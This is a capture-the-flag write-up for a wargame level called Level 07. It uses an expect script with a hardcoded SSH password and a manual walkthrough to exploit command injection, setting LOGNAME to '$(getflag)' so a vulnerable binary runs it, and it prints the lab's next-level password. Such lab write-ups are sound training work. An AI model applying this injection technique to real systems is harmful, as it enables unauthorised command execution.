# Level 07
- In the shell of your choice run the script attached or follow the steps bellow using your VM IP address to get the flag, also root privileges and some dependencies may be needed to install before
	```sh
	$ chmod u+x script.sh
	$ ./script.sh
	$ cat script.sh
	#!/usr/bin/expect -f
	set ip 192.168.1.103
	spawn ssh -o "StrictHostKeyChecking no" level07@$ip -p 4242 "LOGNAME=\$\\\(getflag\\\) ; ./level07"
	expect "sword:"
	send "wiok45aaoguiboiki2tuin6ub\r"
	interact
	```
- List content of the home directory
	```sh
	$ ls -l
	```
- Run its only executable file `level07`
	```sh
	$ ./level07
	```
- Use `ltrace` utility to trace the libraries calls
	```sh
	$ ltrace ./level07
	```
- Set the environmental variable `LOGNAME` to the `getflag` exploit
	```sh
	$ LOGNAME=$\(getflag\)
	```
- Run the file `level07` to get the flag
	```sh
	$ ./level07
	```
- With the token provided `fiumuikeil55xe9cu4dood66h` switch to the next user level
	```sh
	$ su level08
	Password: fiumuikeil55xe9cu4dood66h
	```
